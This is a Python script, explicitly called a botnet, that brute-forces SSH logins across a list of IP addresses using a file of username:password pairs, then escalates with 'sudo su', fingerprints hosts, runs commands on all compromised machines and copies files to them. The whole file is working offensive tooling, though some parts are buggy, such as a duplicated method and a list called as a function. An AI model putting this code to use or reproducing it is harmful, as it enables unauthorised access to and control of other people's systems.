#!/usr/bin/python
import pxssh
from pexpect import *
import pexpect
import PySweeper
import sys
import time
import signal
from time import sleep
import threading


class Client(threading.Thread):

    def __init__(self, host, credentials):
        threading.Thread.__init__(self)
        self.credentials = credentials
        self.commands = []
        self.host = host
        self.hostname = None
        self.user = None
        self.password = None
        self.version = None
        self.session = None

    def run(self):
        for user, password in self.credentials:
            try:
                s = pxssh.pxssh()
                s.login(self.host, user, password)
                print("Success")
                self.session = s
                self.user = user
                self.password = password
                break
            except:
                print("Failure")

    def store_command_data(self, command, output):
        self.commands.append((command, output))


class Botnet:

    def __init__(self, ips, credentials):
        self.clients = []
        self.unconnected_hosts = []
        with open(ips) as f:
            self.ips = [x.strip() for x in f.readlines()]
        with open(credentials) as f:
            self.credentials = [x.strip().split(':') for x in f.readlines()]

    def disconnect(self):
        for client in self.clients:
            client.session.logout()

    def connect(self):
        clients = []
        for ip in self.ips:
            client = Client(ip, self.credentials)
            clients.append(client)
            client.start()

        for client in clients:
            client.join()

        for client in clients:
            if client.session is not None:
                self.clients.append(client)
            else:
                self.unconnected_hosts(client.host)

    def go_sudo(self):
        for client in self.clients:
            client.session.sendline("sudo su")
            sleep(.5)
            client.session.sendline(client.password)
            print("password sent")

    def get_client_info(self):
        for client in self.clients:
            client.session.sendline("echo $HOSTNAME")
            client.session.prompt()
            split_output = client.session.before.split("\n")
            client.hostname = split_output[1]
            client.session.sendline("sw_vers -productVersion")
            client.session.prompt()
            split_output = client.session.before.split("\n")
            client.version = split_output[1]

    def send_command(self, command, clients):
        for client in clients:
            client.session.sendline(command)
            client.session.prompt()
            split_output = client.session.before.split("\n")
            del split_output[0]
            output = ""
            for line in split_output:
                output += line + "\n"
            client.store_command_data(command, output)

    def send_command(self, command):
        for client in self.clients:
            #print("sent cmd")
            client.session.sendline(command)
            client.session.prompt()
            split_output = client.session.before.split("\n")
            del split_output[0]
            output = ""
            for line in split_output:
                output += line + "\n"
            client.store_command_data(command, output)
            #print("stored output")

    def send_file_or_folder(self, file_or_folder, to_location):
        for client in self.clients:
            client.session.sendline("scp -r " + file_or_folder + " " + client.user + "@" + client.host + ":" + to_location)
            client.session.prompt()
            client.session.sendline(client.password)

    def print_output(self):
        for client in self.clients:
            print "\n" + client.host
            for command, output in client.commands:
                print "\n" + command
                print "\n" + output


def print_color(text, color):
    if color is "green":
        print("\033[92m" + text + "\033[0m")
    elif color is "red":
        print("\033[91m" + text + "\033[0m")
    elif color is "yellow":
        print("\033[93m" + text + "\033[0m")
    else:
        print(text + "\nColor not found!")


def main():

    botnet = Botnet("/etc/ips", "/etc/pass")
    botnet.connect()
    #botnet.go_sudo()
    botnet.send_command("ls -la")
    #print("cmd sent")
    botnet.print_output()
    #botnet.disconnect()


if __name__ == "__main__":
    main()
